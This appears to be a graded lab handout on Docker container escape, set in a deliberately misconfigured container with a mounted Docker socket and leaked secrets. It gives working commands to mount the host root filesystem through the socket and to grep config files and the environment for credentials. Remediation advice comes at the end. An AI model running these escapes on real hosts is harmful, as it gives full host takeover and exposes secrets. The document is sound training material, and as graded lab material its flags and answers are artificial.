# Lab 10: Container Escape & Security

**Roadmap:** Phase 5 (Docker security — capabilities, escapes, CIS Benchmark) · **Time:** 3–5 hours · **Points:** 14

## Scenario
You popped a web app and landed a shell in its container, **`web-prod-07`** (`lab10-victim`). Like a
depressing number of real-world containers, it was run carelessly: it's **`--privileged`**, the **host Docker
socket is bind-mounted inside it**, and secrets are lying around in its config and environment. Your job is to
recognise these misconfigurations and **break out of the container to take over the host** — the single most
important container-security concept there is: *a container is not a security boundary when it's misconfigured.*

> This plays to your Docker experience from the attacker's side. Don't read `victim/entrypoint.sh` — it's the
> answer key.

## Start the lab
```powershell
cd "C:\Users\S I N O\Downloads\ciber security labs\labs\lab10-container-escape"
docker compose up -d --build
```
Then get your foothold shell inside the compromised container:
```powershell
docker exec -it lab10-victim bash
```
Everything is done from **inside** that shell. (Yes, you're using Docker to enter a container that you then
escape — that's just how the lab hands you the foothold. Treat the shell as if you'd gotten it through the app.)

## Read first (about 1 h)
1. OWASP Docker Security Cheat Sheet (socket exposure, `--privileged`, capabilities, hardening): https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
2. Sysdig — How to detect and prevent container escapes (docker.sock abuse, host mounts): https://sysdig.com/learn-cloud-native/how-to-detect-and-prevent-container-escapes
3. Why mounting `docker.sock` = root on the host: https://docs.docker.com/engine/security/#docker-daemon-attack-surface
4. Linux capabilities & `--privileged`: https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities

## Enumerate the container first
```bash
# Am I in a container? what's mounted? what privileges do I have?
cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
mount | grep -iE 'docker|sock'          # look for the socket
capsh --print                           # your capabilities (privileged = all of them)
env                                      # secrets leak here
find / -name '*.conf' 2>/dev/null | head # app config on disk
```

---

## Tasks (14 pts)
Flags look like `FLAG{esc_..._...}`. Recover and submit each.

| # | Task | Technique | Pts |
|---|------|-----------|-----|
| 1 | **Recon.** Find the single most dangerous thing bind-mounted into this container. Submit its **path**. | Discovery | 2 |
| 2 | **Escape to the host.** Abuse that mount to run a container that mounts the **host filesystem**, and read `/opt/lab10/host_flag` on the host. | **T1611 (Escape to Host)** | 5 |
| 3 | **Config secret.** The app left a credential in a config file on disk. Find and submit it. | T1552.001 | 2 |
| 4 | **Environment secret.** A cloud API key is exposed in the container's environment. Submit it. | T1552.007 | 2 |
| 5 | **Privilege recon.** Besides the socket, which Docker **run flag** gives this container full host-level power? | — | 2 |
| 6 | **Knowledge.** What is the MITRE ATT&CK **technique ID** for "Escape to Host"? | — | 1 |

### Starter commands (work out the exact escape yourself)
```bash
# Task 1 - what's mounted that shouldn't be?
mount | grep sock ; ls -l /var/run/docker.sock

# Task 2 - the socket talks to the HOST's Docker daemon. Spawn a container that mounts the host's
# root filesystem at /host, then read the flag from it. (You have the `docker` CLI already.)
docker ps                                   # proof: you can see every container on the host
docker run --rm -v /:/host <image> cat /host/opt/lab10/host_flag

# Task 3 - app secrets on disk
grep -ri 'token\|flag' /etc/app/ 2>/dev/null

# Task 4 - secrets in the environment
env | grep -i key

# Task 5 - inspect your own powers
capsh --print        # a privileged container has the full capability set
```

### Hints
<details><summary>Task 2</summary>The mounted <code>/var/run/docker.sock</code> is the Docker daemon's API — talking to it is equivalent to root on the host. Use the bundled <code>docker</code> client: <code>docker run --rm -v /:/host debian:bookworm-slim cat /host/opt/lab10/host_flag</code>. The <code>-v /:/host</code> mounts the <em>host's</em> root inside your throwaway container.</details>
<details><summary>Task 5</summary>Run <code>capsh --print</code> or <code>cat /proc/self/status | grep Cap</code>. Having <em>every</em> capability (CapEff all set) is the signature of a container started with one specific <code>docker run</code> flag.</details>

**Bonus (not graded):** because you're `--privileged`, you can also escape *without* the socket — e.g. mount the
host's disk device directly, or abuse the cgroup `release_agent`. Try one and note it in your report.

---

## Submitting
In chat: `lab 10 task 1: /var/run/docker.sock`, `lab 10 task 2: FLAG{esc_host_...}`, `lab 10 task 6: T1611`, etc.

## Write it up
In `lab10-container-escape/report.md`, write a **container security review**: each misconfiguration, how you
exploited it, the blast radius (socket/privileged = full host compromise), and the remediation —
**never mount `docker.sock` into a container**, drop `--privileged` and add only the capabilities needed,
run rootless/non-root, use read-only mounts, keep secrets out of images/env (use a secrets manager), and apply
seccomp/AppArmor. Reference the **CIS Docker Benchmark**.

## Reset (new flags)
```powershell
docker compose down; docker compose up -d --build
```
